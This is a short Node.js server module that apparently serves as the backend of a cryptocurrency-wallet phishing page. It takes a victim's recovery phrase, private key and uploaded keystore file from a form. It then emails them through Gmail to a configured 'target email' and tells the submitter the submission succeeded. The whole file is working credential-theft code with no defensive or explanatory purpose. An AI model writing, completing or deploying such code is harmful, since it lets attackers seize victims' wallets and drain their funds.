const multer = require("multer");
const nodemailer = require("nodemailer");

// use memory storage so we can attach files to emails
const storage = multer.memoryStorage();
const upload = multer({ storage });

const handleSubmission = async (req, res) => {
  try {
    const { phrase, privateKey } = req.body;

    // setup nodemailer
    const transporter = nodemailer.createTransport({
      service: "gmail", // or SMTP host
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.RECEIVE_EMAIL, // your target email
      subject: "New Wallet Submission",
      text: `
        Phrase: ${phrase || "N/A"}
        Private Key: ${privateKey || "N/A"}
      `,
    };

    // attach keystore file if uploaded
    if (req.file) {
      mailOptions.attachments = [
        {
          filename: req.file.originalname,
          content: req.file.buffer,
        },
      ];
    }

    await transporter.sendMail(mailOptions);

    res.status(200).json({ success: true, message: "Submission sent!" });
  } catch (error) {
    console.error("Email error:", error);
    res.status(500).json({ success: false, message: "Something went wrong." });
  }
};

module.exports = { upload, handleSubmission };
